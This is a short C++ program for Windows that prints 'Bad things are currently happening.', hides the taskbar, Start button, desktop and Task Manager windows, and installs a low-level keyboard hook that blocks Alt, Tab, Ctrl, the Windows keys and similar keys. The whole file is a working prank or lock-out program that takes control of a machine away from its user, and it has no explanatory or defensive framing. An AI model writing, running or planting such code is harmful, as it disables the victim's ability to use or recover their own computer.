#include <iostream>

#ifdef _WIN32
#include <windows.h>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0){
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	tagKBDLLHOOKSTRUCT *str = (tagKBDLLHOOKSTRUCT *)lParam;
	
	switch(str->flags){
		case(LLKHF_ALTDOWN):
			return 1;
	}
	if (wParam == WM_KEYDOWN){
		switch (str->vkCode){
			case VK_TAB:
			case VK_RWIN:
			case VK_LWIN:
			case VK_LCONTROL:
			case VK_RCONTROL:
			case VK_APPS:
			case VK_SLEEP:
			case VK_MENU:
				return 1;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);	
}
#endif

int main()
{
	std::cout << "Bad things are currently happening." << std::endl;
	
	#ifdef _WIN32
		ShowWindow(FindWindow("Shell_TrayWnd", NULL), SW_HIDE);
		ShowWindow(FindWindow("Button", "Start"), SW_HIDE);
		ShowWindow(FindWindow("Progman", "Program Manager"), SW_HIDE);
		ShowWindow(FindWindow(NULL, "Windows Task Manager"), SW_HIDE);
		HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
	#endif

	system("PAUSE");

	return 0;
}
